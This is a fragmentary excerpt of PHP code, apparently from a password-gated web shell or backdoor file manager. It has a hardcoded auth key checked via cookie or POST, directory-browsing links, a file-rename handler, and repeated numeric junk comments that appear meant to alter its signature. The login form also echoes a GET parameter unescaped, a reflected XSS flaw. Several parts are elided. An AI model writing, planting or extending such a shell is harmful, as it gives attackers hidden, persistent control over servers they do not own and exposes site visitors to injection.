...
$auth_key = "bba5c1e256309019ffdeb21ffd7eef6e";
...
$pass = false;
if (isset($_COOKIE['pw_name_14286'])) {
    if(($_COOKIE['pw_name_14286']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_14286'])) {
        if(($_POST['pw_name_14286']) == $auth_key) {
            setcookie("pw_name_14286", $_POST['pw_name_14286']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_14286' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1723829946112374 1723829946360987 1723829946114502 1723829946687226
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1723829946112374 1723829946360987 1723829946114502 1723829946687226
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1723829946112374 1723829946360987 1723829946114502 1723829946687226
            $name = PATH . "/" . $_GET['r'];
